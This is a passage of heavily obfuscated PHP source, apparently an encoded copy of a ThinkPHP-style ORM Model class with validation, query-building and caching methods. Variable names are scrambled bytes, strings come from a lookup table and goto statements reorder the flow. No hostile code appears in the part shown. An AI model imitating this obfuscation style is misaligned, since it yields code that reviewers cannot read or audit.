$a«¹™¥©¨) === 1; } private function autoOperation(&$e¥œÆÂÕÚˆ, $Bë•¥ã³Úº) { $aÄƒ¡”†©Ê =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($this->options[$aÄƒ¡”†©Ê[313]])) { $c÷Ãõ•Ì×• = $this->options[$aÄƒ¡”†©Ê[313]]; unset($this->options[$aÄƒ¡”†©Ê[313]]); } elseif (!empty($this->_auto)) { $c÷Ãõ•Ì×• = $this->_auto; } if (isset($c÷Ãõ•Ì×•)) { foreach ($c÷Ãõ•Ì×• as $a‹š¡àƒ¹È) { if (empty($a‹š¡àƒ¹È[2])) { $a‹š¡àƒ¹È[2] = THINK_MODEL_INSERT; } if ($Bë•¥ã³Úº == $a‹š¡àƒ¹È[2] || $a‹š¡àƒ¹È[2] == THINK_MODEL_BOTH) { switch (trim($a‹š¡àƒ¹È[3])) { case $aÄƒ¡”†©Ê[314]: case $aÄƒ¡”†©Ê[315]: $aîÛ—ïÂà = isset($a‹š¡àƒ¹È[4]) ? (array) $a‹š¡àƒ¹È[4] : array(); if (isset($e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]])) { array_unshift($aîÛ—ïÂà, $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]]); } if ($aÄƒ¡”†©Ê[314] == $a‹š¡àƒ¹È[3]) { $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]] = call_user_func_array($a‹š¡àƒ¹È[1], $aîÛ—ïÂà); } else { $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]] = call_user_func_array(array(&$this, $a‹š¡àƒ¹È[1]), $aîÛ—ïÂà); } break; case $aÄƒ¡”†©Ê[266]: $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]] = $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[1]]; break; case $aÄƒ¡”†©Ê[316]: if ($aÄƒ¡”†©Ê[33] === $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]]) { unset($e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]]); } break; case $aÄƒ¡”†©Ê[317]: default: $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]] = $a‹š¡àƒ¹È[1]; } if (!1 === $e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]]) { unset($e¥œÆÂÕÚˆ[$a‹š¡àƒ¹È[0]]); } } } } return $e¥œÆÂÕÚˆ; } protected function autoValidation($f•¯©ÇŠ, $b¼ ‚Š–²») { $DÇ‚÷ïËÊï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($this->options[$DÇ‚÷ïËÊï[318]])) { $a²®’™² = $this->options[$DÇ‚÷ïËÊï[318]]; unset($this->options[$DÇ‚÷ïËÊï[318]]); } elseif (!empty($this->_validate)) { $a²®’™² = $this->_validate; } if (isset($a²®’™²)) { if ($this->patchValidate) { $this->error = array(); } foreach ($a²®’™² as $DÛÓ¥Ì•’ => $A¢ˆÌÑâÄŸ) { if (empty($A¢ˆÌÑâÄŸ[5]) || $A¢ˆÌÑâÄŸ[5] == THINK_MODEL_BOTH || $A¢ˆÌÑâÄŸ[5] == $b¼ ‚Š–²») { if (0 == strpos($A¢ˆÌÑâÄŸ[2], $DÇ‚÷ïËÊï[319]) && strpos($A¢ˆÌÑâÄŸ[2], $DÇ‚÷ïËÊï[320])) { $A¢ˆÌÑâÄŸ[2] = think_lang(substr($A¢ˆÌÑâÄŸ[2], 2, -1)); } $A¢ˆÌÑâÄŸ[3] = isset($A¢ˆÌÑâÄŸ[3]) ? $A¢ˆÌÑâÄŸ[3] : THINK_EXISTS_VALIDATE; $A¢ˆÌÑâÄŸ[4] = isset($A¢ˆÌÑâÄŸ[4]) ? $A¢ˆÌÑâÄŸ[4] : $DÇ‚÷ïËÊï[321]; switch ($A¢ˆÌÑâÄŸ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($f•¯©ÇŠ, $A¢ˆÌÑâÄŸ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($DÇ‚÷ïËÊï[33] != trim($f•¯©ÇŠ[$A¢ˆÌÑâÄŸ[0]])) { if (!1 === $this->_validationField($f•¯©ÇŠ, $A¢ˆÌÑâÄŸ)) { return !1; } } break; default: if (isset($f•¯©ÇŠ[$A¢ˆÌÑâÄŸ[0]])) { if (!1 === $this->_validationField($f•¯©ÇŠ, $A¢ˆÌÑâÄŸ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E¾æ‚áçÊ„, $bù¬Ô‡Ü†) { if (!1 === $this->_validationFieldItem($E¾æ‚áçÊ„, $bù¬Ô‡Ü†)) { if ($this->patchValidate) { $this->error[$bù¬Ô‡Ü†[0]] = $bù¬Ô‡Ü†[2]; } else { $this->error = $bù¬Ô‡Ü†[2]; return !1; } } return; } protected function _validationFieldItem($fÕŠĞš±ïÊ, $D‹¸ë«ôÅ) { $d–ÌÄãÕ”™ =& $_SERVER[ºÖÙÂŒäÉê‡]; switch (strtolower(trim($D‹¸ë«ôÅ[4]))) { case $d–ÌÄãÕ”™[314]: case $d–ÌÄãÕ”™[315]: $cØÓÀØ¼îÕ = isset($D‹¸ë«ôÅ[6]) ? (array) $D‹¸ë«ôÅ[6] : array(); if (is_string($D‹¸ë«ôÅ[0]) && strpos($D‹¸ë«ôÅ[0], $d–ÌÄãÕ”™[47])) { $D‹¸ë«ôÅ[0] = explode($d–ÌÄãÕ”™[47], $D‹¸ë«ôÅ[0]); } if (is_array($D‹¸ë«ôÅ[0])) { foreach ($D‹¸ë«ôÅ[0] as $DĞ¼¥²æÑø) { $B«õ¿ˆÊª¯[$DĞ¼¥²æÑø] = $fÕŠĞš±ïÊ[$DĞ¼¥²æÑø]; } array_unshift($cØÓÀØ¼îÕ, $B«õ¿ˆÊª¯); } else { array_unshift($cØÓÀØ¼îÕ, $fÕŠĞš±ïÊ[$D‹¸ë«ôÅ[0]]); } if ($d–ÌÄãÕ”™[314] == $D‹¸ë«ôÅ[4]) { return call_user_func_array($D‹¸ë«ôÅ[1], $cØÓÀØ¼îÕ); } else { return call_user_func_array(array(&$this, $D‹¸ë«ôÅ[1]), $cØÓÀØ¼îÕ); } case $d–ÌÄãÕ”™[322]: return $fÕŠĞš±ïÊ[$D‹¸ë«ôÅ[0]] == $fÕŠĞš±ïÊ[$D‹¸ë«ôÅ[1]]; case $d–ÌÄãÕ”™[323]: if (is_string($D‹¸ë«ôÅ[0]) && strpos($D‹¸ë«ôÅ[0], $d–ÌÄãÕ”™[47])) { $D‹¸ë«ôÅ[0] = explode($d–ÌÄãÕ”™[47], $D‹¸ë«ôÅ[0]); } $aÇ±‚Ÿ¹ê÷ = array(); if (is_array($D‹¸ë«ôÅ[0])) { foreach ($D‹¸ë«ôÅ[0] as $DĞ¼¥²æÑø) { $aÇ±‚Ÿ¹ê÷[$DĞ¼¥²æÑø] = $fÕŠĞš±ïÊ[$DĞ¼¥²æÑø]; } } else { $aÇ±‚Ÿ¹ê÷[$D‹¸ë«ôÅ[0]] = $fÕŠĞš±ïÊ[$D‹¸ë«ôÅ[0]]; } if (!empty($fÕŠĞš±ïÊ[$this->getPk()])) { $aÇ±‚Ÿ¹ê÷[$this->getPk()] = array($d–ÌÄãÕ”™[324], $fÕŠĞš±ïÊ[$this->getPk()]); } if ($this->where($aÇ±‚Ÿ¹ê÷)->find()) { return !1; } return !0; default: return $this->check($fÕŠĞš±ïÊ[$D‹¸ë«ôÅ[0]], $D‹¸ë«ôÅ[1], $D‹¸ë«ôÅ[4]); } } public function check($BÉİ„ğ„à‘, $e£¼å‹ÖÈî, $bôÂÚ¯¨œ = "\162\145\147\x65\170") { $F™Áø¬¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bôÂÚ¯¨œ = strtolower(trim($bôÂÚ¯¨œ)); switch ($bôÂÚ¯¨œ) { case $F™Áø¬¢[7]: case $F™Áø¬¢[325]: $bËšÒÅÀğ = is_array($e£¼å‹ÖÈî) ? $e£¼å‹ÖÈî : explode($F™Áø¬¢[47], $e£¼å‹ÖÈî); return $bôÂÚ¯¨œ == $F™Áø¬¢[7] ? in_array($BÉİ„ğ„à‘, $bËšÒÅÀğ) : !in_array($BÉİ„ğ„à‘, $bËšÒÅÀğ); case $F™Áø¬¢[326]: case $F™Áø¬¢[327]: if (is_array($e£¼å‹ÖÈî)) { $dî³æöâŒ = $e£¼å‹ÖÈî[0]; $EøöÁ—Âóœ = $e£¼å‹ÖÈî[1]; } else { list($dî³æöâŒ, $EøöÁ—Âóœ) = explode($F™Áø¬¢[47], $e£¼å‹ÖÈî); } return $bôÂÚ¯¨œ == $F™Áø¬¢[326] ? $BÉİ„ğ„à‘ >= $dî³æöâŒ && $BÉİ„ğ„à‘ <= $EøöÁ—Âóœ : $BÉİ„ğ„à‘ < $dî³æöâŒ || $BÉİ„ğ„à‘ > $EøöÁ—Âóœ; case $F™Áø¬¢[328]: case $F™Áø¬¢[329]: return $bôÂÚ¯¨œ == $F™Áø¬¢[328] ? $BÉİ„ğ„à‘ == $e£¼å‹ÖÈî : $BÉİ„ğ„à‘ != $e£¼å‹ÖÈî; case $F™Áø¬¢[330]: $aâÒèŒøŒª = mb_strlen($BÉİ„ğ„à‘, $F™Áø¬¢[331]); if (strpos($e£¼å‹ÖÈî, $F™Áø¬¢[47])) { list($dî³æöâŒ, $EøöÁ—Âóœ) = explode($F™Áø¬¢[47], $e£¼å‹ÖÈî); return $aâÒèŒøŒª >= $dî³æöâŒ && $aâÒèŒøŒª <= $EøöÁ—Âóœ; } else { return $aâÒèŒøŒª == $e£¼å‹ÖÈî; } case $F™Áø¬¢[332]: list($D¸õ±ª½Á, $f½íÄ“Ã»Î) = explode($F™Áø¬¢[47], $e£¼å‹ÖÈî); if (!is_numeric($D¸õ±ª½Á)) { $D¸õ±ª½Á = strtotime($D¸õ±ª½Á); } if (!is_numeric($f½íÄ“Ã»Î)) { $f½íÄ“Ã»Î = strtotime($f½íÄ“Ã»Î); } return NOW_TIME >= $D¸õ±ª½Á && NOW_TIME <= $f½íÄ“Ã»Î; case $F™Áø¬¢[333]: return in_array(get_client_ip(), explode($F™Áø¬¢[47], $e£¼å‹ÖÈî)); case $F™Áø¬¢[334]: return !in_array(get_client_ip(), explode($F™Áø¬¢[47], $e£¼å‹ÖÈî)); case $F™Áø¬¢[321]: default: return $this->regex($BÉİ„ğ„à‘, $e£¼å‹ÖÈî); } } public function query($EìÈì–äù, $bÃµŠ‘æË = false) { $B–ÊŞ¶ß… =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_bool($bÃµŠ‘æË) && !is_array($bÃµŠ‘æË)) { $bÃµŠ‘æË = func_get_args(); array_shift($bÃµŠ‘æË); } $EìÈì–äù = str_replace(array($B–ÊŞ¶ß…[174], $B–ÊŞ¶ß…[335]), $B–ÊŞ¶ß…[50], $EìÈì–äù); $EìÈì–äù = $this->parseSql($EìÈì–äù, $bÃµŠ‘æË); return $this->db->query($EìÈì–äù); } public function execute($a¬é¢êÆÎ, $e¡²Òº© = false) { if (!is_bool($e¡²Òº©) && !is_array($e¡²Òº©)) { $e¡²Òº© = func_get_args(); array_shift($e¡²Òº©); } $a¬é¢êÆÎ = $this->parseSql($a¬é¢êÆÎ, $e¡²Òº©); return $this->db->execute($a¬é¢êÆÎ); } protected function parseSql($DÎãÌÜËŸ†, $Bƒ©‚¼Îç”) { $aÊ—’ïÙ™Û =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!0 === $Bƒ©‚¼Îç”) { $aÛö“ÍÖë… = $this->_parseOptions(); $DÎãÌÜËŸ† = $this->db->parseSql($DÎãÌÜËŸ†, $aÛö“ÍÖë…); } elseif (is_array($Bƒ©‚¼Îç”)) { $Bƒ©‚¼Îç” = array_map(array($this->db, $aÊ—’ïÙ™Û[336]), $Bƒ©‚¼Îç”); $DÎãÌÜËŸ† = vsprintf($DÎãÌÜËŸ†, $Bƒ©‚¼Îç”); } else { $DÎãÌÜËŸ† = strtr($DÎãÌÜËŸ†, array($aÊ—’ïÙ™Û[337] => $this->getTableName(), $aÊ—’ïÙ™Û[338] => think_config($aÊ—’ïÙ™Û[237]))); } $this->db->setModel($this->name); return $DÎãÌÜËŸ†; } public function db($aªÅĞÇÊ¼¥ = '', $a·±ƒÅİ©º = '', $c¾‹¥ôĞ§ê = array()) { goto e øòĞùÏÕ; e øòĞùÏÕ: $bª¾–¬Ù¼× =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($bª¾–¬Ù¼×[33] === $aªÅĞÇÊ¼¥ && $this->db) { return $this->db; } static $B¬–½áõ—µ = array(); goto Eí‡—ˆµâ«; E²Ÿ´¶šàƒ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F’™ŠÔª·—; eì‚éâ˜Õä: $B¬–½áõ—µ[$aªÅĞÇÊ¼¥] = $a·±ƒÅİ©º; $this->db = $e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥]; $this->_after_db(); goto E²Ÿ´¶šàƒ; Eí‡—ˆµâ«: static $e×†ˆ·‡‚’ = array(); if (!isset($e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥]) || isset($e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥]) && $a·±ƒÅİ©º && $B¬–½áõ—µ[$aªÅĞÇÊ¼¥] != $a·±ƒÅİ©º) { if (!empty($a·±ƒÅİ©º) && is_string($a·±ƒÅİ©º) && !1 === strpos($a·±ƒÅİ©º, $bª¾–¬Ù¼×[8])) { $a·±ƒÅİ©º = think_config($a·±ƒÅİ©º); } $e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥] = Db::getInstance($a·±ƒÅİ©º); } elseif (NULL === $a·±ƒÅİ©º) { $e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥]->close(); unset($e×†ˆ·‡‚’[$aªÅĞÇÊ¼¥]); return; } if (!empty($c¾‹¥ôĞ§ê)) { if (is_string($c¾‹¥ôĞ§ê)) { parse_str($c¾‹¥ôĞ§ê, $c¾‹¥ôĞ§ê); } foreach ($c¾‹¥ôĞ§ê as $b†’Ó’ÍÏ => $a°ùáßØÂÑ) { $this->setProperty($b†’Ó’ÍÏ, $a°ùáßØÂÑ); } } goto eì‚éâ˜Õä; F’™ŠÔª·—: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Dß¹çæª¨ = get_class($this); if ($Dß¹çæª¨ == $_SERVER[ºÖÙÂŒäÉê‡][339]) { return $this->name; } $this->name = substr($Dß¹çæª¨, 0, -5); } return $this->name; } public function getTableName() { $Bõ‚÷²‰å¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($this->trueTableName)) { $BŠŞ¤±“â = !empty($this->tablePrefix) ? $this->tablePrefix : $Bõ‚÷²‰å¬[33]; if (!empty($this->tableName)) { $BŠŞ¤±“â .= $this->tableName; } else { $BŠŞ¤±“â .= think_parse_name($this->name); } $this->trueTableName = strtolower($BŠŞ¤±“â); } return (!empty($this->dbName) ? $this->dbName . $Bõ‚÷²‰å¬[91] : $Bõ‚÷²‰å¬[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fİŞÄƒÏÅ =& $_SERVER[ºÖÙÂŒäÉê‡]; return isset($this->fields[$fİŞÄƒÏÅ[244]]) ? $this->fields[$fİŞÄƒÏÅ[244]] : $this->pk; } public function getDbFields() { $d—‡â™ùï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($this->options[$d—‡â™ùï[272]])) { $Bæ×ô¶™µ = $this->db->getFields($this->options[$d—‡â™ùï[272]]); return $Bæ×ô¶™µ ? array_keys($Bæ×ô¶™µ) : !1; } if ($this->fields) { $Bæ×ô¶™µ = $this->fields; unset($Bæ×ô¶™µ[$d—‡â™ùï[243]], $Bæ×ô¶™µ[$d—‡â™ùï[244]], $Bæ×ô¶™µ[$d—‡â™ùï[245]], $Bæ×ô¶™µ[$d—‡â™ùï[242]]); return $Bæ×ô¶™µ; } return !1; } public function data($B“ÅÊùœ¿À = '') { $EªŠ×Å§¡‘ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($EªŠ×Å§¡‘[33] === $B“ÅÊùœ¿À && !empty($this->data)) { return $this->data; } if (is_object($B“ÅÊùœ¿À)) { $B“ÅÊùœ¿À = get_object_vars($B“ÅÊùœ¿À); } elseif (is_string($B“ÅÊùœ¿À)) { parse_str($B“ÅÊùœ¿À, $B“ÅÊùœ¿À); } elseif (!is_array($B“ÅÊùœ¿À)) { think_exception(think_lang($EªŠ×Å§¡‘[264])); } $this->data = $B“ÅÊùœ¿À; return $this; } public function join($b¥ÅÜèØ†Ğ) { $föˆŒó³ù° =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($b¥ÅÜèØ†Ğ)) { $this->options[$föˆŒó³ù°[275]] = $b¥ÅÜèØ†Ğ; } elseif (!empty($b¥ÅÜèØ†Ğ)) { $this->options[$föˆŒó³ù°[275]][] = $b¥ÅÜèØ†Ğ; } return $this; } public function union($cíÀ÷îİéÆ, $b‚¶ó„ôÍ¼ = false) { goto aªôªƒ¼›¹; aªôªƒ¼›¹: $aÖÇ†Ç„øà =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($cíÀ÷îİéÆ)) { return $this; } if ($b‚¶ó„ôÍ¼) { $this->options[$aÖÇ†Ç„øà[340]][$aÖÇ†Ç„øà[341]] = !0; } goto FˆÑ›ÎšÃâ; c—°Ü”ç¤: return $this; goto f¬ÍŠ¿¾¶; FˆÑ›ÎšÃâ: if (is_object($cíÀ÷îİéÆ)) { $cíÀ÷îİéÆ = get_object_vars($cíÀ÷îİéÆ); } if (is_string($cíÀ÷îİéÆ)) { $eç™™¾äñÙ = $cíÀ÷îİéÆ; } elseif (is_array($cíÀ÷îİéÆ)) { if (isset($cíÀ÷îİéÆ[0])) { $this->options[$aÖÇ†Ç„øà[340]] = array_merge($this->options[$aÖÇ†Ç„øà[340]], $cíÀ÷îİéÆ); return $this; } else { $eç™™¾äñÙ = $cíÀ÷îİéÆ; } } else { think_exception(think_lang($aÖÇ†Ç„øà[264])); } $this->options[$aÖÇ†Ç„øà[340]][] = $eç™™¾äñÙ; goto c—°Ü”ç¤; f¬ÍŠ¿¾¶: } public function cache($C‰Û‚‹«– = true, $e‹ÎØ²Õ„› = null, $E¢òö¨°²© = '') { $aĞ”ø›ŠÓë =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!1 !== $C‰Û‚‹«–) { $this->options[$aĞ”ø›ŠÓë[342]] = array($aĞ”ø›ŠÓë[89] => $C‰Û‚‹«–, $aĞ”ø›ŠÓë[332] => $e‹ÎØ²Õ„›, $aĞ”ø›ŠÓë[29] => $E¢òö¨°²©); } return $this; } public function field($DœÊõ¬¼ê, $Dº±Ïñ³¨İ = false) { $f·è¼ÈñÖ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!0 === $DœÊõ¬¼ê) { $B÷ÆŒ«‘™¯ = $this->getDbFields(); $DœÊõ¬¼ê = $B÷ÆŒ«‘™¯ ? $B÷ÆŒ«‘™¯ : $f·è¼ÈñÖ[182]; } elseif ($Dº±Ïñ³¨İ) { if (is_string($DœÊõ¬¼ê)) { $DœÊõ¬¼ê = explode($f·è¼ÈñÖ[47], $DœÊõ¬¼ê); } $B÷ÆŒ«‘™¯ = $this->getDbFields(); $DœÊõ¬¼ê = $B÷ÆŒ«‘™¯ ? array_diff($B÷ÆŒ«‘™¯, $DœÊõ¬¼ê) : $DœÊõ¬¼ê; } $this->options[$f·è¼ÈñÖ[266]] = $DœÊõ¬¼ê; return $this; } public function scope($F“œƒÀƒÚ = '', $cÀ¹ÈÙê‡ = NULL) { $eœÉÏ°˜†ò =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($eœÉÏ°˜†ò[33] === $F“œƒÀƒÚ) { if (isset($this->_scope[$eœÉÏ°˜†ò[34]])) { $cõ¸êù¥ = $this->_scope[$eœÉÏ°˜†ò[34]]; } else { return $this; } } elseif (is_string($F“œƒÀƒÚ)) { $AÉÒ‡×«È‚ = explode($eœÉÏ°˜†ò[47], $F“œƒÀƒÚ); $cõ¸êù¥ = array(); foreach ($AÉÒ‡×«È‚ as $C¢ô•ŠÌ°) { if (!isset($this->_scope[$C¢ô•ŠÌ°])) { continue; } $cõ¸êù¥ = array_merge($cõ¸êù¥, $this->_scope[$C¢ô•ŠÌ°]); } if (!empty($cÀ¹ÈÙê‡) && is_array($cÀ¹ÈÙê‡)) { $cõ¸êù¥ = array_merge($cõ¸êù¥, $cÀ¹ÈÙê‡); } } elseif (is_array($F“œƒÀƒÚ)) { $cõ¸êù¥ = $F“œƒÀƒÚ; } if (is_array($cõ¸êù¥) && !empty($cõ¸êù¥)) { $this->options = array_merge($this->options, array_change_key_case($cõ¸êù¥)); } return $this; } public function where($cï”†ô°ÓÍ, $B†¨‰î—ïÊ = null) { $f·î¡Ù“¾Ğ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_null($B†¨‰î—ïÊ) && is_string($cï”†ô°ÓÍ)) { if (!is_array($B†¨‰î—ïÊ)) { $B†¨‰î—ïÊ = func_get_args(); array_shift($B†¨‰î—ïÊ); } $B†¨‰î—ïÊ = array_map(array($this->db, $f·î¡Ù“¾Ğ[336]), $B†¨‰î—ïÊ); $cï”†ô°ÓÍ = vsprintf($cï”†ô°ÓÍ, $B†¨‰î—ïÊ); } elseif (is_object($cï”†ô°ÓÍ)) { $cï”†ô°ÓÍ = get_object_vars($cï”†ô°ÓÍ); } elseif (is_array($cï”†ô°ÓÍ)) { foreach ($cï”†ô°ÓÍ as $aÌØƒ®óŸ« => $FÖÜŒ­ÂŠ‰) { if ((is_numeric($aÌØƒ®óŸ«) || !$aÌØƒ®óŸ«) && is_string($FÖÜŒ­ÂŠ‰)) { think_trace($f·î¡Ù“¾Ğ[343], $f·î¡Ù“¾Ğ[33], $f·î¡Ù“¾Ğ[46]); die; } } } if (is_string($cï”†ô°ÓÍ) && $f·î¡Ù“¾Ğ[33] != $cï”†ô°ÓÍ) { $F«Œæ‰ˆ· = array(); $F«Œæ‰ˆ·[$f·î¡Ù“¾Ğ[344]] = $cï”†ô°ÓÍ; $cï”†ô°ÓÍ = $F«Œæ‰ˆ·; } if (isset($this->options[$f·î¡Ù“¾Ğ[268]])) { $this->options[$f·î¡Ù“¾Ğ[268]] = array_merge($this->options[$f·î¡Ù“¾Ğ[268]], $cï”†ô°ÓÍ); } else { $this->options[$f·î¡Ù“¾Ğ[268]] = $cï”†ô°ÓÍ; } return $this; } public function limit($Fí¡ÙÍŸÊ‘, $fõÛŞƒ…Ÿ = null) { $F‰æ‹ÌÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->options[$F‰æ‹ÌÉ[285]] = is_null($fõÛŞƒ…Ÿ) ? $Fí¡ÙÍŸÊ‘ : $Fí¡ÙÍŸÊ‘ . $F‰æ‹ÌÉ[47] . $fõÛŞƒ…Ÿ; return $this; } public function page($FÇ”­„§÷, $bÁËğè˜ª = null) { $A”·¯¤ã†Ò =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->options[$A”·¯¤ã†Ò[345]] = is_null($bÁËğè˜ª) ? $FÇ”­„§÷ : $FÇ”­„§÷ . $A”·¯¤ã†Ò[47] . $bÁËğè˜ª; return $this; } public function comment($CëŠÀî…ÓØ) { $this->options[$_SERVER[ºÖÙÂŒäÉê‡][346]] = $CëŠÀî…ÓØ; return $this; } public function setProperty($aÅá»©¢ˆ£, $dôÎÜêö é) { if (property_exists($this, $aÅá»©¢ˆ£)) { $this->{$aÅá»©¢ˆ£} = $dôÎÜêö é; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\164\x2c\x75\x70\144\141\x74\x65", "\x66\165\x6e\143\x74\x69\x6f\156"), array("\143\x72\x65\141\164\x65\x54\151\x6d\x65", "\164\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\143\x74\151\x6f\156")); public function setDataAuto($C’À‡²åÜ¦) { $this->dataAuto = $C’À‡²åÜ¦; } public function __construct($d“åè¡ÑÊ‘ = '', $a¹»ŠŒñ¹ = '', $cÓÓöìÛÏŠ = '') { parent::__construct($d“åè¡ÑÊ‘, $a¹»ŠŒñ¹, $cÓÓöìÛÏŠ); } public static function textEncode($dÖ‘ê›ÜƒË) { if (!$dÖ‘ê›ÜƒË) { return $dÖ‘ê›ÜƒË; } $b‘‘Õà‰ˆø = json_encode($dÖ‘ê›ÜƒË); $b‘‘Õà‰ˆø = preg_replace_callback($_SERVER[ºÖÙÂŒäÉê‡][347], function ($fŞÆ‰æœ ­) { return addslashes($fŞÆ‰æœ ­[0]); }, $b‘‘Õà‰ˆø); return json_decode($b‘‘Õà‰ˆø); } public static function textDecode($BŠ†íøËˆõ) { $EÙ•ùÅ£ŒÜ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‘º›í»Ï© = json_encode($BŠ†íøËˆõ); $b‘º›í»Ï© = preg_replace_callback($EÙ•ùÅ£ŒÜ[348], function ($EÌ›¸¨œ¯³) { return $_SERVER[ºÖÙÂŒäÉê‡][93]; }, $b‘º›í»Ï©); return json_decode($b‘º›í»Ï©); } protected $tableMeta = array(); protected function _beforeInsert(&$d×«’…Œå, $E÷‘Ù‡„ˆ) { $C—õ´ïœô =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->checkDataAutoHas($C—õ´ïœô[349])) { return; } $this->dataBeforeFilter($d×«’…Œå, $C—õ´ïœô[349]); } protected function _beforeUpdate(&$AöÎÈ“Ï¢, $EÇÎÜ×Ì·‚) { $cê™éŸè„ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->checkDataAutoHas($cê™éŸè„[350])) { return; } $this->dataBeforeFilter($AöÎÈ“Ï¢, $cê™éŸè„[350]); } protected function _afterSelect(&$cŒöÛ«ÁÙí, $DáÈ¨†ğÎ) { if (!is_array($cŒöÛ«ÁÙí)) { return; } if (!$this->checkDataAutoHas($_SERVER[ºÖÙÂŒäÉê‡][351])) { return; } foreach ($cŒöÛ«ÁÙí as &$A¾Şòİ) { $this->dataAfterFilter($A¾Şòİ); } } protected function _afterFind(&$E×«œ’è¾, $A¦®¸Ë±á¡) { if (!is_array($E×«œ’è¾)) { return; } if (!$this->checkDataAutoHas($_SERVER[ºÖÙÂŒäÉê‡][351])) { return; } $this->dataAfterFilter($E×«œ’è¾); } public function setAutoIncrement($A÷çå›Ÿ·¿) { $cÌ²Ô™´° = array($this->getPk() => $A÷çå›Ÿ·¿); $Dåœ¿Ç˜” = $this->data($cÌ²Ô™´°)->add(); if ($Dåœ¿Ç˜”) { $this->delete($Dåœ¿Ç˜”); } } public function getAutoIncrement() { $EÙ‘ÏµÉ®ã = $this->getTableName(); $fë´—¿ Î = $this->max($this->getPk()); $BÑÁƒ¡ÑÔ = $this->query("\163\150\157\167\40\164\x61\142\x6c\x65\40\x73\164\141\x74\x75\163\x20\x77\x68\x65\162\x65\x20\x4e\x61\x6d\145\75\x27{$EÙ‘ÏµÉ®ã}\47"); $A²«ÙÆ„»² = $BÑÁƒ¡ÑÔ[0][$_SERVER[ºÖÙÂŒäÉê‡][352]]; $dæ¬œÏ×¿ò = max($fë´—¿ Î, $A²«ÙÆ„»²); return $dæ¬œÏ×¿ò; } protected function _callBefore($f«œ„İÔÉã, $aØƒïîÊî) { return $this->cacheCallCheck($f«œ„İÔÉã, $aØƒïîÊî, !1); } protected function _callAfter($fğ¿¨¬š·Ô, $C‡¹ó£ï“) { return $this->cacheCallCheck($fğ¿¨¬š·Ô, $C‡¹ó£ï“, !0); } protected function cacheFunctionAlias($aã‰´ãŞ½‘) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($a¢ÓÒ—½², $E¡£³Ÿ÷‰, $dÙ¾Ü¥±—± = false) { $eå’Éƒå¨Ş = $this->cacheFunctionAlias($E¡£³Ÿ÷‰); if (!$eå’Éƒå¨Ş) { return; } foreach ($eå’Éƒå¨Ş as $FÓòÄ£‚Ïğ => $c“ğ‚ÆÑ÷º) { $Aä¬ŒÁ„ = $c“ğ‚ÆÑ÷º[0]; $B²‚Òœ‚ª = explode($_SERVER[ºÖÙÂŒäÉê‡][47], $c“ğ‚ÆÑ÷º[1]); if ($a¢ÓÒ—½² == $FÓòÄ£‚Ïğ) { return $this->cacheFunctionGet($FÓòÄ£‚Ïğ, $Aä¬ŒÁ„); } if ($dÙ¾Ü¥±—± && in_array($a¢ÓÒ—½², $B²‚Òœ‚ª)) { $this->cacheFunctionClear($FÓòÄ£‚Ïğ, $Aä¬ŒÁ„); } } } public function cacheFunctionGet($C…„åìØÉ…, $eáÉ„Ü¸æï) { $dÇ£ìíÜÍ¥ = $this->cacheKeyMake($C…„åìØÉ…, $eáÉ„Ü¸æï); $BÄ¿À¦æ†ö = Cache::get($dÇ£ìíÜÍ¥); if (!is_array($BÄ¿À¦æ†ö)) { $BÄ¿À¦æ†ö = call_user_func_array(array($this, $C…„åìØÉ…), array($eáÉ„Ü¸æï, !0)); Cache::set($dÇ£ìíÜÍ¥, $BÄ¿À¦æ†ö); } return $BÄ¿À¦æ†ö; } public function cacheFunctionClear($a‹Ğ©‚‘‘, $Cæİİî†) { 